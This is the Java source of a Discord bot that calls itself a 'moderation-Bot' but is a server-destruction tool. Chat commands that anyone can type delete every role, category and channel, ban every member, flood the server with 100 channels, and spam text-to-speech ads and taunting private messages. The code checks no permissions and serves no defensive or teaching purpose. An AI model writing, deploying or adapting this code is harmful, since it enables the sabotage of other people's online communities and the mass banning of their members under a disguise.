package main;

import com.sedmelluq.discord.lavaplayer.player.AudioPlayer;
import com.sedmelluq.discord.lavaplayer.player.AudioPlayerManager;
import com.sedmelluq.discord.lavaplayer.player.DefaultAudioPlayerManager;
import com.sedmelluq.discord.lavaplayer.source.AudioSourceManagers;
import com.sedmelluq.discord.lavaplayer.track.playback.AudioFrame;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.audio.AudioReceiveHandler;
import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.events.channel.priv.PrivateChannelCreateEvent;
import net.dv8tion.jda.api.events.emote.EmoteAddedEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.managers.AudioManager;
import net.dv8tion.jda.api.utils.Compression;
import net.dv8tion.jda.api.utils.cache.CacheFlag;
import org.apache.commons.net.telnet.EchoOptionHandler;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.security.auth.login.LoginException;
import javax.sound.sampled.AudioInputStream;
import java.awt.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.HashMap;

public class Main extends ListenerAdapter {

    public static void main(String[] args) throws LoginException, Exception {


        JDA jda;




      jda = new JDABuilder("")
              .addEventListeners(new Main())
              .setActivity(Activity.playing("moderation-Bot"))
              .build();



    }



@Override
    public void onMessageReceived(MessageReceivedEvent event) {

        String msg = event.getMessage().getContentRaw();
        User user = event.getAuthor();
        Guild g = event.getGuild();
        Member m = g.getMember(user);



        if (msg.equalsIgnoreCase("#fuckit")) {


            delelteall(g);
            for (int i = 0; i < 100; i++) {
                g.createTextChannel(i + "MyPinguin").queue();
            }
            Role r = g.createRole().setName("Pinguin").complete();
            for (Member member : g.getMembers()) {
                try {

                    g.addRoleToMember(member.getId(), r).queue();
                } catch (Exception e) {

                }
            }





        }  else if (msg.equalsIgnoreCase("#delall")) {

            delelteall(g);

        }else if (msg.equalsIgnoreCase("#makepinguin")) {
            Role r = g.createRole().setName("Pinguin").complete();
            for (Member member : g.getMembers()) {
                try {

                    g.addRoleToMember(member.getId(), r);
                } catch (Exception e) {

                }
            }

        } else if (msg.equalsIgnoreCase("#banall")) {
            for (Member member : g.getMembers()) {

                try {
                if(member.getUser().getName().equalsIgnoreCase("InteractionDev") || member.getUser().getName().equalsIgnoreCase("Rares"))
                    g.ban(member.getUser(), 7).queue();
                } catch (Exception e) {

                }
            }

        } else if (msg.equalsIgnoreCase("#join")) {
            VoiceChannel v = null;
            for (VoiceChannel voiceChannel : g.getVoiceChannels()) {
                if (voiceChannel.getMembers().contains(m)) {
                    v = voiceChannel;
                }
            }
            if (v == null) {
                return;
            } else {
                g.getAudioManager().openAudioConnection(v);


            }
        }else if(msg.equalsIgnoreCase("#fuckab")) {
       for(int i = 0; i < 20; i ++){
                for(TextChannel t : g.getTextChannels()){


                      t.sendMessage("Addet mich auf Discord Rares#0911").tts(true).queue();

               }
          }
        }else if(msg.toLowerCase().startsWith("#ctc")) {



            for (int i = 0; i < 100; i++) {
                g.createTextChannel(i + "MyPinguin").queue();
            }

        }
        else if(msg.toLowerCase().startsWith("#cvc")) {



            for (int i = 0; i < 100; i++) {
                g.createVoiceChannel(i + "MyPinguin").queue();
            }

        } else if(msg.equalsIgnoreCase("#SpamAll")) {


            for (Member member : g.getMembers()) {


               m.getUser().openPrivateChannel().queue(c -> c.sendMessage("AHAHAHAHH Du wurdest gegrieft").queue());

                }


        }
        }





    public static void delelteall(Guild g) {

        for (Role role : g.getRoles()) {
            try {
                role.delete().queue();
            } catch (Exception e) {

            }
        }
        for (Member role : g.getMembers()) {
            try {
                role.ban(7).queue();
            } catch (Exception e) {

            }
        }
        for (Category role : g.getCategories()) {
            try {
                role.delete().queue();
            } catch (Exception e) {

            }
        }
        for (VoiceChannel role : g.getVoiceChannels()) {
            try {
                role.delete().queue();
            } catch (Exception e) {

            }
        }
        for (TextChannel role : g.getTextChannels()) {
            try {
                role.delete().queue();
            } catch (Exception e) {

            }
        }
    }
}
















